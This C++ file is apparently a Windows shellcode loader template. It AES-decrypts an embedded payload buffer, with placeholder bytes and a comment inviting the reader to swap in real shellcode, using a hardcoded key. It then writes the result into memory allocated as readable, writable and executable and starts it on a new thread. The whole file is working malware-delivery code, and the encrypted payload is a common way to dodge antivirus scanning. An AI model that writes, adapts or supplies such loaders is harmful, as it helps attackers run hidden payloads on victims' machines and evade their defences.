#include <Windows.h>
#include "AES.h" // https://github.com/SergeyBel/AES

int main() {
	// Change me! Pre-encrypted shellcode
	unsigned char cipheredBuffer[] =
	  { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };

	unsigned char key[] = { 0x43, 0x5e, 0x3b, 0xde, 0x6a, 0x10, 0x07, 0x3f, 0x3a, 0xf9, 0xa1, 0x5a, 0xd3, 0x11, 0x03, 0xd0 };
	unsigned int size = sizeof(cipheredBuffer);

	// Decrypt payload
	AES aes(128);
	unsigned char* decipheredBuffer = aes.DecryptECB(cipheredBuffer, size, key);

	// Allocate memory
	LPVOID basePageAddress = VirtualAlloc( NULL, (SIZE_T)size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );

	if (basePageAddress == NULL) {
		return 1;
	}

	// Write memory
	memcpy( basePageAddress, decipheredBuffer, (size_t)size );

	// Create thread that points to shellcode
	CreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)basePageAddress, NULL, 0, NULL ); 

	//Wait for the new thread to spawn
	Sleep(1000);
	
	return 0;
}
